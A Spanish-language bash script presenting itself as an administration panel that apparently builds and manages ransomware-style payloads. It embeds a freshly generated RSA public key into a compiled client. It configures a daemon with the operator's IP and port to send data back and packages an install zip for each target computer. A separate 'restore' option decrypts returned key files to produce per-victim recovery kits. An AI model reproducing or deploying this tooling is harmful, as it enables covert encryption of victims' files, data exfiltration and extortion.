echo "Panel de administracion"
cd /opt/server/adminpanel
echo "Que quieres hacer"
echo "1) Agregar Computador"
echo "2) Leer llave RSA"
echo "3) Restaurar Computador"

read -p "Opción: " RSP

case $RSP in
	1)
		read -p "Computador: " COMPU
		read -p "Contraseña: " PASSWD
		echo "[*] Generando RSA"
		RSA=`openssl genrsa 4096`
		echo "Computador: "$COMPU
		echo -ne "\nGuardando llave\n"

		echo "$RSA" | openssl enc -aes-256-cbc -pass pass:$PASSWD -out keys/$COMPU.key 2>/dev/null

		echo "[*] Extrayendo la clave publica e.e"
		PKEY=`echo "$RSA" | openssl rsa -outform PEM -pubout`
		PFKEY="\"`echo "$PKEY" | grep -v "PUBLIC KEY" | tr -d '\n'`\""

		echo "[*] Compilando principal.c"

		gcc ../src/principal.c -DKEY_PUB=$PFKEY -D_DEBUG -o ../bin/principal
		#gcc ../src/server.c -D_DEBUG -D_LOGFILE=../bin/server_logs -o ../bin/server 

		echo "[*] Compilacion completa"
		echo "[*] Generando install.sh"
		cp ../install_client/install.sh ../bin/

		echo "[*] Generando Daemon"

		echo "Seleccione su IP de red"
		for i in `ifconfig | grep "inet " | cut -d " " -f 10`; do
			echo "*) $i"
		done
		read -p "IP: " LHOST
		echo "Ingrese puerto para envio de datos"
		read -p "Puerto: " LPORT
		echo "$LHOST:$LPORT"
		cat ../Daemon/nottoday | sed s/'\[IP\]'/$LHOST/g | sed s/'\[PORT\]'/$LPORT/g > ../bin/nottoday

		echo "[*] Comprimiendo..."
		cd ../bin/
		zip ${COMPU}_install.zip install.sh nottoday principal
		rm -rf install.sh nottoday principal
		echo "[*] Configuracion Completa"
		echo "El archivo zip se encuentra en: "`cd ../bin;pwd`"/${COMPU}_install.zip"
		echo "Envie el archivo a la computadora, extraiga y ejecute el archivo install.sh"
	;;

	2)
		echo "Cual de todas quieres leer?"
		for i in `ls keys`; do
			echo "*) "${i::-4}
		done
		read -p 'Computador: ' COMPU
		echo -n "Contraseña: "
		read -s  PASSWD
		echo ""
		echo "[*] Mostrando:"
		openssl enc -aes-256-cbc -d -pass pass:$PASSWD -in keys/$COMPU.key 2>/dev/null
		echo ""
	;;

	3)
        echo "Que computador quieres restaurar?"
        for i in `ls keys`
        do
			echo "*) "${i::-4}
        done
        read -p 'Computador: ' COMPU
        read -p 'Contraseña: ' PASSWD
		read -p 'Nombre del archivo .enc [ service server status ]: ' ENVIAME
        echo ""
        echo "[*] Desencriptando:"
        RSA=`openssl enc -aes-256-cbc -d -pass pass:$PASSWD -in keys/$COMPU.key 2>/dev/null`
		echo "$RSA" > /tmp/clave.pem
		cat /tmp/enctest/$ENVIAME | base64 -d | openssl rsautl -decrypt -inkey /tmp/clave.pem > ../bin/key.txt
		rm /tmp/clave.pem
		echo "[*] Comprimiendo..."
		cp ../recuperacion/repa.sh ../bin/repa.sh
		cd ../bin
		zip ${COMPU}_repair.zip repa.sh key.txt
		rm repa.sh key.txt
        echo "[*] Compresion Completa"
		echo "El archivo zip se encuentra en: "`cd ../bin;pwd`"/${COMPU}_repair.zip"
        echo "Envie el archivo a la computadora, extraiga y ejecute el archivo repa.sh"
		echo ""
	;;

	*)
		echo "[*] Error Input."
esac
